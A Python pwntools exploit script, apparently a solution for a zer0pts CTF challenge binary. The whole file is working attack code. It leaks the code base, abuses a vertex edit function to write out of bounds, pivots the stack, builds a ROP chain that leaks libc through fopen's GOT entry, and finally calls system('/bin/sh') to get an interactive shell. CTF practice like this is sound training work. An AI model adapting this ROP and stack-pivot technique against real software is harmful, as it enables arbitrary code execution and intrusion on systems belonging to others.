#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'pwn1.ctf.zer0pts.com', 9002
binary = './chall'
brkpts = '''
b _d_newclass
c
c
c
'''

elf = ELF("chall")
libc = ELF("libc.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a, drop=True)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

def new(name,vertices):
    sla("> ", "1")
    sla("Name: ", str(name))
    sla("vertices: ", str(len(vertices)))
    for i in vertices:
        sla("= ", "({},{})".format(i[0], i[1]))

def show(name):
    sla("> ", "2")
    sla("Name: ", str(name))

def rename(oldname,newname, rn = False):
    sla("> ", "3")
    sla("Name: ", str(oldname))
    sla("Name: ", str(newname))
    if rn:
        sla("[y/N]: ", rn)

def edit(name,index,vertex):
    sla("> ", "4")
    sla("Name: ", str(name))
    sla("Index: ", str(index))
    sla("= ", "({},{})".format(vertex[0], vertex[1]))

def delete(name):
    sla("> ", "5")
    sla("Name: ", str(name))

if __name__ == "__main__":
    new("tmptmp1", [[0xf, 0xf], [0xf, 0xf], [0xf, 0xf], [0xf, 0xf]])
    new("tmptmp2", [[0xf, 0xf], [0xf, 0xf], [0xf, 0xf], [0xf, 0xf]])
    new("tmptmp3", [[0xf, 0xf], [0xf, 0xf], [0xf, 0xf], [0xf, 0xf]])

    show("5")
    reu("_Dmain [")
    code_base = int(reu("]"), 16) - 0xa1e5d
    log.info("Code base @ "+hex(code_base))

    bss = code_base + 0x14c000

    rename("tmptmp1", "tmptmp3", "n")

    pivot = code_base + 0xc0a71 #: push rsi ; or byte [rax-0x75], cl ; pop rsp ; and al, 0x08 ; add rsp, 0x28 ; ret

    pivot1_ptr = bss + 0x2468
    addr = pivot1_ptr / 8
    val = pivot
    vals = [val & 0xffffffff, (val >> 32) & 0xffffffff]

    edit("tmptmp1", addr, vals)

    pop_rdi = code_base + 0x0011f893
    ret = code_base + 0x0a001a
    pop_rsi_r15 = code_base + 0x0011f891
    pop_rdx = code_base + 0x00107c56
    pop_rcx = code_base + 0x000a4a40
    pop_rbp = code_base + 0x000a08c3
    pop_rbx_rbp = code_base + 0x000a36c3
    mov_rsp = code_base + 0x000a0967

    rsi_ptr = bss + 0x4890 + 0x28
    addr = rsi_ptr / 8

    new_rsp = bss + 0x4930

    arg1 = bss + 0x1bd70
    arg2 = new_rsp
    arg3 = 3
    arg4 = code_base + 0x120091
    stdin_fn = code_base + 0xaf914

    ropchain = [
        pop_rdi, code_base + elf.got['fopen'],
        ret,
        code_base + elf.plt['printf'],
        pop_rdi, arg1,
        pop_rsi_r15, arg2, 0,
        pop_rdx, arg3,
        pop_rcx, arg4,
        stdin_fn,
        pop_rbx_rbp, 0, 0,
        mov_rsp
    ]

    for i in range(len(ropchain)):
        val = ropchain[i]
        vals = [val & 0xffffffff, (val >> 32) & 0xffffffff]

        edit("tmptmp1", addr+i, vals)

    show("5")

    leak = uu64(re(6))
    libc.address = leak - libc.symbols['fopen']
    log.info("leak @ "+hex(leak))
    log.info("libc @ "+hex(libc.address))
    log.info("binsh @ "+hex(next(libc.search("/bin/sh"))))

    payload = flat([
        0,
        pop_rdi,
        next(libc.search("/bin/sh")),
        ret,
        libc.symbols['system']
    ])

    sl(payload)

    io.interactive()
